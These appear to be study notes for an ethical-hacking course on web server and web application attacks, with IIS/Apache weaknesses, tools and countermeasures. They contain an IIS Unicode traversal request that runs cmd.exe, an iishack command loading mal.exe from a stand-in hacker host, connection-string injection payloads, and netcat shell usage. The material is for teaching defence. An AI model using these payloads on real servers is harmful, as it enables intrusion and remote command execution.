- Identify specific misconfigured applications within a live environment which, when exploited, will give attackers greater influence over a network.
Lesson objectives:
- Understand the different forms of XSS
- Understand how XSS can exploit a user system
- Know how to prevent XSS
Instructional Lab: Cross-Site Scripting (XSS)
- Identify a poorly configured site which performs XSS attacks against user browsers, then implement mechanisms to prevent XSS on an application under their purview.
Lesson objectives:
- Understand the two primary types of deserialization attacks
- Understand which types of applications leverage serialization
- Learn how to prevent deserialization attacks
Instructional Lab: Insecure Deserialization
- Identify applications with potential insecure deserialization vulnerabilities. Take action to test the vulnerability to see if the environment is susceptible.
Lesson objectives:
- Understand characteristics which indication potentially vulnerable
 Lesson and Lab
 Cross-Site Scripting (XSS)
 Lesson and Lab
 Insecure Deserialization
 Lesson and Lab
Using Components with Known
Vulnerabilities
 applications
- Know the importance of testing for vulnerabilities
- Understand how to prevent potential compromise through
implementing proven applications
Instructional Lab: Insecure Deserialization
- Identify applications which are potentially vulnerable to exploitation, take action to address the vulnerabilities and harden the system.
Lesson objectives:
- Understand the importance of log monitoring
- Understand how inattentive administrators miss attacks
- Know how to prevent poor logging mechanisms within an
infrastructure
Instructional Lab: Insecure Deserialization
- Identify a misconfigured event logger and identify key events which required should have been escalated. Reconfigure the logger to ensure appropriate notification and logging occurs.
Challenge Lab:
- As a web app penetration tester, it will be your responsibility to apply learned skills and techniques in order to complete an injection-based web app security challenge.
Challenge Lab
- Using knowledge from the Broken Authentication (#2) and
 Lesson and Lab
 Insufficient Logging and Monitoring
 Challenge Lab
 Injection Challenge
 Challenge Lab
Authentication & Security Misconfiguration
Challenge
 Security Misconfigurations (#6) labs, complete this final challenge lab!
- Discuss Phishing attacks
- Conduct Phishing examples
Phishing attacks are the lynchpin of many organizational breaches and exploitations. Cyber security professionals that understand this also understand that many of these attacks are successful due to lack of understanding by end users. This course will teach cyber security professionals how to perform a phishing attack and illustrate the importance of cyber security awareness when browsing the internet.
Lesson objectives:
- Discuss cross site script attacks
- Implement a cross site script attack
Instructional Lab: Testing Web Application
Part of a comprehensive defense-in-depth implementation includes testing new capabilities and applications before implementing them into an organizations production network. This course illustrates how students can conduct testing against newly developed web applications to ensure they do not pose a risk to organizational assets.
SQL Injection is a common technique used by hackers and red teams to
 Browser Attacks
Lesson
 Phishing and Browser Exploitation
 Lab/Instructional
  Testing Web Apps
Lesson and Lab
  Lab/Instructional
 SQL Injection infiltrate database systems via the Web UI. In this lab, we will give student hands-on experience with this type of attack.
Lesson objectives:
- Understand how to start services with XAMPP in order to run DVWA, a web application.
- Understand how to capture packets with Wireshark to expose data leakage within DVWA.
Instructional Lab: Data Leakage
Students will learn the importance of data integrity through comparative analysis of hash algorithm output. Leveraging hashing tools, students will learn how to ensure that data is not compromised post-incident.
Lesson objectives:
- Configure FireFox to us BurpSuite as a proxy
- Use BurpSuite to intercept client-server requests
- Manipulate a cookies session ID to bypass login
Instructional Lab: Session Hijacking
Students will identify web application cookies, interact with Burp, and a MITM attack.
  Lesson objectives:
Lesson and Lab
 Data Leakage
Lesson and Lab
 Session Hijacking
 Lesson and Lab
 DDoS Detection - Observe and identify a DDoS SYN-Flood attack on a webserver.
- Utilize firewall tools to mitigate future attacks of this type.
Instructional Lab: DDoS Detection
Students will experience the different components of a distributed denial of service attack.
Lesson objectives:
- Utilize Wireshark to isolate client data
- Establish Baseline Data Flows
- Conduct Packet Analysis
- Discover possible nefarious data flow
Instructional Lab: Chrome Extension Testing
In early 2018, security researchers discovered several nefarious Chrome extensions that were making unwanted calls to ad servers. This resulted in the removal of these Chrome extensions from the Google Extension Store and a heightened awareness to the possible effects of Chrome extensions on business networks.
Lesson objectives:
- Learn the fundamentals of DNS harvesting and how it applies to the blue team side of cybersecurity
- Grasp the basics of search modifiers
- Use Kali Linux and its command line tools in order to conduct
DNS harvesting techniques
- Use Ubuntu Linux and Google Chrome in order to pinpoint web
results using search engine directives
Instructional Lab: Harvesting DNS and Focusing Web Searches
 Lesson and Lab
 Chrome Extension
 Lesson and Lab
Harvesting DNS and Focusing Web
Searches
 Kali Linux has a multitude of command line tools that can be used to harvest DNS information from public servers. As a technical cybersecurity professional, it will be your responsibility to put these tools to use. Also, you will need to use Ubuntu Linux in order to focus your web queries within Google's search engine. In this case, you will be using the Nexus to tie these skills together in order to get familiar with real-world information gathering situations.
 Lesson and Lab
 Investigating HTTP Request Methods
Lesson objectives:
- Learn HTTP, Wireshark and Netcat in order to apply an understanding of HTTP request methods
- Use Kali Linux and Ubuntu Linux in order to properly setup a multi-system LAN
- Use Wireshark in order to analyze the HTTP GET and POST request methods that were previouisly generated
- Use Netcat in order to further analyze how these methods can be used in a CLI
Instructional Lab: Harvesting DNS and Focusing Web Searches
Understanding how website applications are developed is an important skill to have when securing your personal or company website. The back and forth communication between a client and a server can be the difference between a secure web app and a vulnerable one. In this lab, as a website application developer, it is your responsibility to understand how HTTP request methods are used and how it ties in to developing a secure website. ▪


## Web Server Hacking
The World Wide Web was developed based on the Hypertext Transfer Protocol (HTTP) and the Hypertext Markup Language (HTML)
HTTP resides in the Application Layer of the TCP/IP stack along with other protocols (FTP, Telnet,
SSL, SMTP...)
  - transport protocol
  - used to exchange information on the WWW between an originating client / user agent (Web browser...) and a destination server.
HTML: a language to develop Web pages on the destination server.
  - In many instances, the communication between the client and the destination server will pass through additional entities such as gateways or proxy servers.
  - HTTP is defined by Internet Request for Comment (RFC) 2616 (HTTP/1.1).
Client to Server Data Exchange
 The client to server interchange typically proceeds as follows:
1. The client browser establishes a TCP connection to port 80 on a remote host server using a Uniform Resource Locator (URL):
  - The browser communicates with a host name server.
  - The name server converts the web server name into an IP address.
  - The browser connects to the web server IP address through port 80.
2. The HTTP web server waits for a GET request message on port 80 from the client browser for a file on the Web page according to the HTTP protocol.
3. The web server receives the request message, it responds with a status message (HTTP/ 1.1 200 OK) and a message (containing additional info like the HTML text for the requested Web page.)
4. The client browser processes the HTML tags and presents the Web page on the client screen. ▪


## Typically, the browser in the above process would be Internet Explorer or Firefox and the transport protocol would be HTTP.
The transport protocol could also be an encryption transport protocol such as Secure Sockets Layer (SSL) or Transport Layer Security (TLS).
Web applications running on a web server include the common gateway interface (CGI) or Active Server Page (ASP) dynamic scripting
environment, which are usually connected to and supported by a database.
Firewalls are normally employed as protection on both ends of the connection.
In a typical architecture
the client browser establishes an HTTP
connection to a web server protected by a firewall.
Web applications running on the server store and
retrieve data from a database protected by a firewall. This architecture is illustrated in Figure 13-1.
   ▪


##  In preparing to launch an attack against a web server, 1. conduct scanning to determine "what is out there.”
tools to scan for Web services: Nmap, SuperScan, and Amap.
Unsecured HTTP web servers traditionally operate on TCP port 80, default port for an HTTPS URL
using encrypted SSL or TLS is 443.
Other relevant ports are 88 for Kerberos and
     ▪


## 8080 for Squid.
  - Kerberos is a third-party authentication paradigm
  - Squid is an opensource Web proxy cache, which supports HTTP, FTP, and various additional URLs.
2. After scanning, hacker will proceed with banner grabbing to determine the type and version of server.
Example for banner grabbing Use Telnet:
  - One common tools for banner grabbing
1. At the command prompt, run telnet<IP Address>
80
2. Key in HEAD/HTTP/1.0 in the telnet window and then hit Enter twice.
3. The Web server banner is then returned, information including the web server being used and the version number.
  - Microsoft IIS web server, URL: 1,747
     - IP: IP address of the web server computer
  - The web server URL can also be used.

▪
www.WebserverA. Com:
 ⁃
  ⁃
Another example: using the GET command: Microsoft Telnet> echo 'GET / HTTP/1.0n' | nc
test.com 80 |
  - egrep ”Server:'
  - Server: Microsoft-IIS/5.1 Microsoft Telnet>
Additional useful tools: FTP, Netcat.
3. attack the web server, defeat authentication, exploit the server, attack an application and gain access to
 information on the database.
Attacking Web Applications
Web applications are most often hacked because of inherent weaknesses built into the program at inception. Developers might overlook known vulnerabilities, forget to patch security flaws, or leave default passwords and accounts open for exploitation.
Identifying entry points is a good place to start. figure out where the application is asking you for input, you’re already looking at a way in.
- To accomplish this, be sure to examine cookies, headers, POST data, and encoding or encryption measures. And the URL can tell you a lot (input parameters and such are often displayed there). There are several tools that can help in identifying your entry points, including WebScarab, HTTPrint, and Burp Suite.
Identifying function and technology on the server side helps greatly as well.
- browse through URLs and get a good idea of server makeup, form, and function.
  - Example: https://anybiz.com/agents.aspx? name=ex%50clients&isActive=0&inDate=20%2F11%2F201 2&stopDate=20%2F05%2F2013&showBy=name
  - The platform is shown easily enough (aspx)
  - we can even see a couple column headers from the back-end
database (inDate, stopDate, and name).
- Error messages and session tokens can also provide valuable information on server-side technology
- A really good way to get this done is mirroring, which provides you with all the time you need on a local copy to check things out. You won’t be able to get actual code, but it will give you time to figure out the best way into the real site for future analysis.
NOTE
Web 2.0
- refers to a somewhat different method of creating websites and applications.
- “A Web 2.0 site may allow users to interact and collaborate with each other in a social media dialogue as creators of user-generated content in a virtual community, in contrast to Web sites where people are limited to the passive viewing of content. Examples of Web 2.0 include social networking sites, blogs, wikis, video sharing sites, hosted services, Web applications, and mashups.”
- Per ECC, because Web 2.0 apps provide for more dynamic user participation, they also offer more attack surface.
Web Server Security Issues
Web servers are attractive targets for attacks by hackers because they provide the Web pages that are the Internet face of organizations and are potentially accessible by a ▪


## determined individual.
Hackers seek to exploit server vulnerabilities and
compromise websites.
the vulnerabilities of the most commonly used
web servers, IIS and Apache, are explored along with typical attacks against these servers.
Older IIS versions were subject to attacks such as the Code Red worm and attacks exploiting IIS Internet Server Application Programming Interface (ISAPI) handlers. The latest version of IIS, version 7, has taken steps to reduce or eliminate these vulnerabilities.
ISAPI and DLL
ISAPI: a series of programs designed to operate with Web servers.
ISAPI provides application developers tools to extend the functionality of a web server.
two types of these programs: ISAPI filters / extensions.
  - ISAPI filters:
  - can be called from a URL
     - can alter information entering and leaving IIS.
  - Examples of applications of ISAPI filters
  - authentication and data compression. 􏰙压
  - ISAPI extensions:
  - can also be called directly from a URL.
  - a dynamic link library (DLL) file that provides special functions called and loaded into memory only once, regardless of the number of clients making use of the functions.
  - One commonly used extension is the dynamic link library,
  - a set of programs
  - called to perform specific functions such as
printing or content indexing.
  - The program in the DLL is called from an executable program, and the executable passes parameters to the DLL program as needed.
  - If the parameters are not passed properly, or if a call to the DLL is not made correctly, a General Protection Fault (GPF) will occur, or the computer will freeze.
IIS Attacks
Three basic types of attacks against IIS. ▪


##  buffer overflow, file system traversal, and source disclosure.
Countermeasures:
IIS buffer overflow: can be mitigated by :
  - conducting frequent scans for server vulnerabilities,
  - promptly acquiring and installing Microsoft service packs,
  - implementing effective firewalls,
  - applying URLSCan and lISLockdown utilities,
  - removing IPP printing capability.
Secure IIS. A number of modifications were made to IIS 6.0 to enhance security, changes include:
  - I Not installing a munber of services and features by default
  - I Improved authentication and access control
  - I Modifications of Active Server Pages (ASP)
components
  - I Installation in locked-down mode
  - I Limitations on Multipurpose lntemet Mail Extensions (MIME) types
  - I Default rendering of ASP.NET and ASP inoperative 1,753

▪
  - I Default inactivation of anonymous password synchronization
  - I Limitation of access by executables File system traversal: can be reduced by
  - promptly applying appropriate Microsoft hotfixes and patches
  - restricting privileges to executables such as cmd.exe,
  - locating the system software on a different disk drive
from the Web site software and content directory.
  - install the IISLockdown tool from Microsoft.
  - This tool includes URSScan software
  - screens web server requests and inhibits requests containing attack-type characters.
Buffer Overflow
Four examples of buffer overflow attacks against IIS
IPP Printer Overflow attack
ISAPI DLL Buffer Overflow attack The WebDAV/ntdll.dll exploit
     ▪


##   the attack using IISHack.exe.
The Printer Overflow exploits the mws3ptr.dll
is the ISAPI filter that interacts with printer files and processes user requests.
Sending an HTTP printer request with 420 bytes in the
Host field to the server will cause the server to overflow and return a command prompt to the sender, who can use hacking tools such as IIShack to initiate an exploit.
The ISAPI DLL Buffer Overflow attack
exploits Microsoft’s IIS Indexing Service DLL (ida.dll)
and Microsoft Data Query file (idq.dll).
result in the execution of malicious code due to a lack
of input buffer parameter checking in the code used to process input URLs for the .idq or .ida application mapping.
The WebDAV/ntdll.dll exploit
Installed versions of IIS include World Wide Web
Distributed Authoring and Versioning (WebDAV) capability as specified in RFC 2518.
This capability implements a standard for file management and editing on the Web.
When a lot of data are sent to WebDAV, the data are
           ▪


## sent to their ntdll.dll components, which do not conduct sufficient bounds checking, causing a buffer overflow.
This condition can result in the execution of malicious code in the IIS environment.
In the IISHack.exe attack
the IIS http daemon buffer is made to overflow, and
malicious code can then be executed.
An attack against WebserverA that is listening to port 80 is summarized in the following commands.
The malicious script is resident on hackserver, and mal.exe is the link to the malicious script.
File System Traversal
web server architecture.
- The server software is designed to accept requests and answer by providing files from specific locations on the server.
- Example
- all of a website’s HTML files, images, and other goodies are located in a single folder (FOLDER_A) off the root of the
        - c : \ iishack www.WebserverA.com 80
  - www. Hackserver.com/mal.exe machine
- all the administrative files for the server itself are located in a separate folder (FOLDER_B) off the root.
- Usually HTML requests come to the web server software asking for a web page, and by default the server goes to FOLDER_A to retrieve them.
 ▪


## Web servers are accessible by the public, clients are permitted access to only a specific partition of the server file system (Web document root directory) ▪


## This directory comprises 包含 the web server application software along with files available to the public.
By modifying a website URL, a hacker can perform a file system traversal and obtain access to files on other parts of
the server or in the Web document root directory.
This attack will expose files located on all parts of the
web server and is initiated by inserting special characters in URLs.
Example:
the character sequence . . / in the URL can initiate a file system
traversal attack / dot dot slash attack.
This basic approach is now recognized by Web servers and no longer can be used for file system traversal.
Also known as the dot-dot-slash attack, directory climbing, and backtracking
sends HTTP requests asking the server to drop back to the root directory and give access to other folders.
example of command:
take the shell back to the root and then to pull up the password
         EXAM TIP ECC sometimes likes asking about parameter or URL tampering. In short, you just manipulate parameters within the URL string in hopes of modifying data such as permissions and elevation of privileges, prices and quantities of goods, and credentials. The trick is to simply look at the URL and find parameters you canadjust and re-send.
A major problem with directory traversal is that it’s sometimes fairly noisy.
- Signature-based IDSs have all sorts of rules in place to look for dot-dot-slash strings and the like.
- One method for getting around this is to use Unicode in the string to represent the dots and slashes. %2e%2e%2f or .. %2f
This dot-dot-slash attack also known as a variant of Unicode or unvalidated input attack.
- Unicode is a standard for ensuring consistent encoding and text representation and can be accepted by servers for malicious purposes.
- Unvalidated input means the server has not been configured to accept only specific input during an HTTP GET, so an attacker can craft the request to ask for command prompts, to try administrative access passwords...
Encoding can be used to bypass Web server filtering and implement a file system traversal attack ▪


## can be deceived and the document root directory can be exited by the attacker.
Unicode encoding: an industry-standard encoding method, used to represent a multitude of languages from around
the world.
  - Unicode standard was developed, coordinated by the Unicode Consortium with the objective of replacing conventional, limited, character encoding methods.
Therefore, Unicode capability in Microsoft web servers provides a path for conducting directory traversal attacks.
Example
the Unicode strings %cl%1c and represent
the characters \ or / and can be used to initiate the . This attack can enable an attacker to traverse to other
directories in the server and have malicious code executed on the web server.
This attack code can be initiated on the Web server by transmitting the followingHTTP string:
  - GET /scripts/ . .%c0%af. ./winnt/system32/cmd.exe? +/c+dir+ ‘c: \ ‘HTTP /1.0
Another type of encoding that can be used to bypass Web server filtering and implement a file system traversal attack, percent encoding / Uniform Resource Identifier (URI) encoding.
      %c0%af
 . . / attack
   ▪


##  example:
In URI encoding, %2e%2e/ and %2e%2e%2f translate
to . . / in the Microsoft web server, thus enabling the file system traversal attack.
A variation of the URI encoding attack is to encode the parent directory strings . ./ twice (that is, encode the string once; then encode the encoded string).
Then, when IIS decodes the URL to check for the
existence of . . / characters, it will not recognize the dangerous string because it is still encoded.
IIS will not recognize the double encoded strings as initiating a file system traversal attack.
The attacker can then escalate privileges on the server or run commands
  - by accessing the system command shell residing at c : \winnt\system32\cmd.exe.
Source Disclosure
IIS is manipulated to reveal 泄露 the source code of a server side
application. This attack can be conducted, for example: against the Microsoft Windows NT File System (NTFS).
     ▪


##  One of the data streams in NTFS
contains the main elements of the file has attribute
$DATA.
The IIS server is vulnerable to file-related requests
involving the $DATA attribute, resulting in the revelation of the contents of the file.
implemented submitting a file request that appends +htr to the global.asa file.
HTR is a first generation HTML-like advanced scripting technology that was never widely adopted.
Active Server Pages (ASP) was in IIS 4.0, displaced HTR.
An additional source disclosure involves the showcode.asp Showcase.asp example files.
IIS 4.0 includes these sample files
to provide information about ASP to Web developers.
showcode.asp provides the ability to view the source code of applications on the server, both within and without the
document root directory, through a browser.
Source code disclosure exploits can provide the following
             ▪


## information to the attacker:
I Credentials from the Web. config file I Database organization
I Source code vulnerabilities
I Knowledge of the application
I Application parameters
I Vulnerabilities in source code comments I Escalation of privileges
I Purchasing data
I Credit card numbers
back in the day, web developer used an HTML code attribute called “hidden.” Despite the fact that it’s a well-known but unsecured method to transmit data, especially on shopping sites, and it’s a generally accepted fact that the web page itself shouldn’t be holding this information, the use of the hidden attribute for pricing and other options is still pretty prevalent.
- how it works
- a website, a surfboard, $659.99
- simply save the code from this page to desktop (being sure to
         - ▪


## check for Unicode encoding if prompted to), change the “price” value to something more reasonable (such as 9.99), save the code, and then open it in a browser.
- The same web page would appear, and when I clicked the Add To Cart button, the surfboard would be added to my cart, with a cost to me of $9.99.
- the hidden field can carry all sorts of other things too.
    Apache Attacks
The Apache server has a high degree of reliability, but also has vulnerabilities.
Some of the attacks that exploit Apache vulnerabilities include:
Apache chunked encoding vulnerability:
  - The HTTP protocol provides for communication
 ▪


## between the Web server and a browser
  - to negotiate the size of chunks of data to be sent to the server when the amount of data being transmitted to the server is not known in advance.
  - A flaw 缺点 in the Apache software misreads the size of the chunks to be received,
  - resulting in a stack overflow, and possibility of executing malicious code.
Mod_proxy buffer overflow: Apache uses the mod_proxy module to set up a proxy server for HTTP and
FTP protocols.
  - A vulnerability in the module file proxy_util.c can lead to a buffer overflow in the web server, enabling the execution of malicious code that can cause a denial of service in the server.
Long URLs: Lengthy URLs processed by the mode_autoindex, mod_negative, and mod_dir modules
can result in the server showing directory contents. PHP scripting:
  - PHP is a general-purpose scripting language that is commonly used with Apache Web servers.
  - PHP can be used with HTML for Web development but contains vulnerabilities that would allow a hacker to run malicious code on the web server host.
       ▪


## URL trailing slashes. 蔓延的
  - Many trailing slashes in a URL can expose a
listing of the original directory.
tools to help in web server attacks
- Brutus: to try brute-forcing web passwords over HTTP
- THC-Hydra is a pretty fast network logon cracker. - Metasploit:
  - the all-in-one attack frameworks, will cover lots of options for you, including exploitation of known vulnerabilities and attacking passwords over Telnet, SSH, and HTTP.
  - A basic Metasploit exploit module consists of five actions: Select the exploit you want to use, configure the various options within the exploit, select a target, select the payload (what you want to execute on the target machine), and then launch the exploit.
  - a toolkit that allows for exploit development and research.
  - Metasploit architecture
  ⁃
  - The framework base accepts inputs from custom plug-ins, interfaces (how you interact with the framework), security tools, web services, and modules (each with its own specific purpose).
  - example
  - Under MODULES
  - EXPLOITS: hold the actual exploit itself (which you can play with, alter, configure, and encapsulate as you see fit)
  - PAYLOADS combines the arbitrary code executed if the exploit is successful.
  - AUXILIARY is used to run one-off actions (like a scan)
  - NOPS is used mainly for buffer-overflow-type operations.
  - REX: is the library for most tasks, such as handling sockets, protocols, and text transformations. ▪


## Connection String/Steam Parameter Pollution CSPP (Connection String Parameter Pollution)
- an injection attack that takes advantage of web applications that communicate with databases by using semicolons to separate each parameter.
  - Concatenating unvalidated input into a database connection may allow an attacker to override the value of a request parameter.
  - An attacker may be able to override existing parameter values, inject a new parameter or exploit variables out of a direct reach.
  - Inject parameters into a connection string using semicolons ; as a separator
  - Inject connection string parameters into other existing parameters.
- If carried out successfully, this attack can be used to steal user identities and hijack web credentials.
This vulnerability is similar to vulnerabilities within HTTP environments where parameter pollution can also occur. However, it also can apply in other places such as database connection strings.
If an application does not properly sanitize the user input, a
malicious user may compromise the logic of the application to perform attacks from stealing credentials, to retrieving the entire
 - ▪


## database.
By submitting additional parameters to an application, and if these
parameters have the same name as an existing parameter, the database connection may react in one of the following ways:
  - It may only take the data from the first parameter
  - It may take the data from the last parameter
  - It may take the data from all parameters and concatenate
them together
This may be dependent on the driver used, the database type, or even how APIs are used.
範例 1:以下程式碼使用來自 HTTP 要求的輸入連線到資料庫:
  ...
string password = Request.Form["db_pass"]; //gets POST parameter 'db_pass' SqlConnection DBconn = new
SqlConnection("Data Source = myDataSource; Initial Catalog = db; User ID = myUsername; Password = " + password + ";");
...
在此範例中，
In this example, the programmer has not considered that an attacker could provide a db_pass parameter such as: "xxx; Integrated Security = true"，
then connection string becomes:
"Data Source = myDataSource; Initial Catalog = db; User ID = myUsername; Password = xxx; Integrated Security =
   ▪


## true; "
This will make the application connect to the database using
the operating system account under which the application is running to bypass normal authentication.
This would mean the attacker could connect to the database without a valid password and perform queries against the database
directly.
範例 2: 以下程式碼使用來自 HTTP 要求的輸入連線到資料庫:
   username = req.field('username') password = req.field('password') ...
client = MongoClient('mongodb://%s: %s@aMongoDBInstance.com/?ssl=true' % (username, password))
...
在此範例中
程式設計師並未考量攻擊者可能提供如下 password 參
數:「myPassword@aMongoDBInstance.com/?ssl=false&」， 則連線字串會變成 (假設使用者名稱為「scott」): 「mongodb://
   ▪


## scott:myPassword@aMongoDBInstance.com/? ssl=false&@aMongoDBInstance.com/?ssl=true」
這會使「@aMongoDBInstance.com/?ssl=true」被當成 額外的無效引數來處理，進而在實際上忽略「ssl=true」，並在沒 有加密的情況下連線至資料庫。
 A web defacement attack results in the page being
- In short, if the hacker is dumb enough to change the visual on the site, alerting everyone in the world that he got it, that’s considered defacement.
- Defacement doesn’t always have to be about embarrassment or feeding an ego. Sometimes defacement can be downright subtle, for whatever purpose, and sometimes it can be designed to inflict real harm on a target.
- Example
- deface the website of a candidate running for office and quietly alter wording to indicate a change in platform, it may not be noticed for a long while. And by the time it is, the damage is done. ▪


## Hacking Tools
A variety of tools have been developed to probe, disassemble, and gain access to code on Web servers. but are also used for hacking.
A summary of some of these tools is listed as follows: IISxploit.exe: automated directory traversal
attacks on IIS.
CleanIISLog: let attacker to cover tracks by
clearing entries of his or her IP address in IIS log files. RPC DCOM:
  - Remote Procedure Call Distributed Component Object Model
  - creates a stack-based buffer overflow attack because of improper handling of TCP/IP messages by Microsoft RPC software.
  - Overflow manifests in RFC DCOM interface at ports 135 or 139.
  - attacker exploit this vulnerability to gain system privileges, create new accounts, install malicious code,
   ▪


## remove / modify files...
cmdasp.asp:
  - ASP runs on a web server and is used to
produce interactive, dynamic Web pages.
  - ASP Web pages can be identified by the
extension .asp rather than .htm.
  - CmdAsp.asp: an interactive command prompt to
an ASP Web page on IIS servers.
  - The USR_COMPUTER and IWAM_COMPUTER user accounts represent a vulnerability in that they will execute scripts such as ASP or Perl and provide a back door to the IIS server.
  - can also
by uploading to the IIS web server.
iiscrack.dll: This is similar to cmd.asp and provides a path for a hacker to send commands that run
on the web server with System privileges.
ispc.exe:
  - a client that copies the Trojan ISAPI DLL to a web server and sets up a remote shell with System privileges.
      hacker’s PC
Cmdasp.asp
send a shell back to the
 nc.exe
   ▪


## Weblnspect: This web server application
vulnerability scanner that categorizes over 1,500 Web pages, can perform over 30,000 security checks, and provide remediation recommendations.
ASN:
  - The Microsoft Abstract Syntax Notation 1 (ASN.1) Library does not check buffer parameters and can suffer a buffer overflow.
  - An attack based on this vulnerability can give the hacker system privileges.
Microsoft Windows NT 4.0 / 2000 Unspecified Executable Path Vulnerability.
  - This enables automatic execution of Trojans when DLL files and executables are not preceded by a registry path.
  - In this situation, the operating system will try to find the file in a sequence of directories in a specific order.
  - This behavior can facilitate the automatic execution of Trojans if they are renamed as executables that do not have a specified path.
execiis-win32.exe: 1,774

▪
server.
  - a directory traversal attack ⁃
 uses cmd to execute commands on an IIS web
Patch Management
is necessary to protect organization from attacks and maintain the continuity and reliability of operations
and production systems.
is the process of organizing and directing the distribution and installation of provisional software
revisions to resources on the network.
This additional software is referred to as a patch.
A similar term is a hotfix, which refers to adding a patch during normal operation of the computer system.
In organizations with large numbers of distributed resources, tracking and installing patches can be expensive, time consuming, and people intensive.
Automated patching systems greatly reduce the 1,775

▪
time and expense of patching.
The motivations for installing patches in a timely manner:
the costs associated with the unavailability of computing resources, the costs to return a victimized computer to operating condition, impact on an organization’s reputation, possible compromise of data, and potential legal liability.
Problems can also result from defective patches
that do not address the identified issues or that create additional vulnerabilities, particularly in automated patching systems.
typical organization might have different versions
OS and app running on a variety of platforms, so a common patch deployment might not be practical and effective.
This situation:
management developing and implementing an
enterprise patch management policy, including specifying and enforcing standard platform configurations.
Management should also evaluate third-party patching products that can reduce the costs and
manpower requirements: ITDefense, ConfigureSoft, Inc.,
   ▪


## PatchLink Corp., and Shavlik Technologies, LLC.
Some popular tools that support or automate the
patching process:
  - UpdateExpert: a security management utility
  - for Windows 2000/NT and Terminal Server computers that supports identifying, downloading, and installing the required hotfixes and service packs.
  - Qfecheck: a Microsoft command-line tool
  - allows network administrators to track and verify
installed Windows 2000/XP hotfixes.
  - HFNetChk: a Microsoft software engine
  - available through the command-line interface of the Microsoft Baseline Security Analyzer (MBSA) Version 1.1.1.
  - allow system administrator to check the patch status of all the machines in a network from a central location by accessing an XML database that is kept current by Microsoft.
  - applicable to a variety of Microsoft products: Windows XP/2000, Windows Server 2003, SQL Server 7.0, Internet Explorer 5.01...
  - Cacls.exe: an interactive, command-line utility
  - for Windows NT / 2000 / XP
  - for managing and storing access control lists
 ▪


## (ACLs).
  - also supports other administrative functions in enterprise environments.
  - Cacls.exe works under the NTFS file system and is stored by default in the %SystemRoot%\System32 folder for all installations of Windows NT / 2000 / XP
Web Application Vulnerabilities
Because of faulty programming practices, numerous Web applications are vulnerable to attack, Common Web application attacks include:
Cross Site Scripting (XSS), remote code execution, username enumeration, SQL injection, Cookie/Session poisoning, command injection, parameter/form tampering, directory traversal,
         ▪


## attack obfuscation, DMZ protocol, Zero-day.
Remote code execution.
hacker execute his system level code on a target web server.
attacker can compromise the web server and access files with the same rights as the server system
software. Example:
a number of XML-RPC PHP programs contain
vulnerability that could enable the transfer of unchecked user commands to the eval ( ) function in the XML-RPC server.
Countermeasures
can be reduced or eliminated by not using shell
commands, if possible.
restrict processing of user input data that has
         ▪


## not been sanitized beforehand.
Username enumeration.
manipulates the backend authentication script to inform
attacker whether a submitted user name is valid.
Iterations 反复 exploiting this vulnerability can aid the attacker in determining the correct user name through
interpretation of error messages.
Initial guesses at usernames might include typical default settings such as guest and admin.
Countermeasures
Compose and return consistent error messages of the type that do not provide keys to valid usernames.
ensure that maintenance, testing, and other general accounts with predictable passwords are not
active when a web application is enabled.
Attack obfuscation 困惑
     ▪


## Steganography XOR cipher ROT13
the practice of obscuring or making something
difficult to analyze or understand.
Code, particularly Java, C++, and Perl code, can be obfuscated in order to prevent reverse engineering of
programs.
Attackers use URL obfuscation to avoid the
possibility of the source of an attack being traced to them.
DMZ protocol
Demilitarized Zone (DMZ) is a neutral, intermediate zone,
between external network and secure, internal network.
A DMZ normally incorporates a firewall
a hacker will attempt to bypass using IP, TCP,
and HTTP protocol attacks
       - ▪


## Related Hacking Tools
A number of programs have been developed to scan websites and store duplicates on a local disk.
These tools provide the user with the ability to examine the target website HTML code and analyze its contents and logic.
Netcat Windows or Linux
  does not come with the operating system, free download.
read and write to network connections using either TCP or UDP .
In addition to scanning, can use Netcat to
categorize the web server (banner grabbing) and proceed with an attack to escalate privileges and provide access to files in all portions of the web server.
 ▪


##  featured networking utility
Can read and write information on TCP and UDP
networks. using the TCP/IP protocol.
a reliable ’back-end’ tool: can be used directly or
easily driven by other programs and scripts.
a feature-rich network debugging and
exploration tool: can create almost any kind of connection you would need and has several interesting built-in capabilities.”
Netcat scanning command is nc -v -w 3 -z WebserverA 40-80.
This example will attempt to connect to ports 40 through 80 on WebserverA in a fast scanning mode specified by the —z switch.
Example:
nc -v -w 3 -z WebserverA 40-80
  - connect to ports 40 through 80 on WebserverA in a fast scanning mode specified by the —z switch.
     - ▪


##  Open a connection to a mail server on port 25
  - nc mymail.server.net 25 listen on port 12345
  - nc -l -p 12345
Common flags:
  - -l: Listen mode (default is client mode)
  - -L Listen harder (supported only on Windows version of netcat). This option makes netcat a persistent listener that starts listening again after a client disconnects.
  - -u UDP mode (default is TCP).
  - -p Local port (in listen mode, this is the port listened on; in client mode, this is the source port for all packets sent).
  - -e Program to execute after connection occurs, connecting STDIN and STDOUT to the program.
Websleuth
an open-source manual exploration tool comprises a variety of Visual BASIC applications
   ▪


## for analyzing the security posture and functionality of Web applications.
It is used by auditors who wish to probe and
evaluate the basic components of Web app and possible vulnerabilities (parameter manipulation, crosssite scripting)
also provides for adding code plug-ins to address specific concerns.
Nikto
   ▪


## an open source web server scanner
scans for malicious files and CGIs on a variety of
servers.
It is a Perl-based vulnerability tool that scans Websleuth screen rapidly
is detectable when it operates. Wikto
a Web-scanning tool
  - similar to Nikto but with added features.
Wikto does not scan Web app or search for open ports,
but probes for web server vulnerabilities such as vulnerable scripts and directories that might be subject to
compromise.
Wikto comprises the following three main elements:
  - Back End Miner. This searches recursively through directories and applies fuzzy logic to ascertain if a file / directory exists.
  - Googler. This searches for directories on the 1,786

website by looking for Google key words, extracting directory names from URLs retrieved, and searching for ” interesting" files on the website. To make use of this feature, a Google key is required.
  - Nikto-like functionality. This performs Nikto— type scans but uses different mechanisms.
A shot of the Wikto Googler screen is shown in Figure 13 —4. ▪


##  Black Widow
a product of SoftByte Labs
performs website scans and website ripping.
Website ripping: copy the structure of a Web site to a local disk and obtain a complete profile of the site
   ▪


## and all its files and links.
Instant Source
provides for examination of the source code of a Web page
works with Internet Explorer and will display source code for selected portions of a Web page.
The tool will also display images, Flash movies, and scripts files on a Web page.
Wget
works With Windows and Unix and can acquire HTML pages and data from FTP sites while working in
background mode.
This tool can time stamp acquired files and note
if changes have occurred over time.
Nessus
   A useful site ripping free tool
can obtain Web files using FTP and HTTP
   - ▪


## freely available, rule-based remote vulnerability scanner
Uses script-based plug-ins.
The source code of Nessus is proprietary to Tenable Network Security.
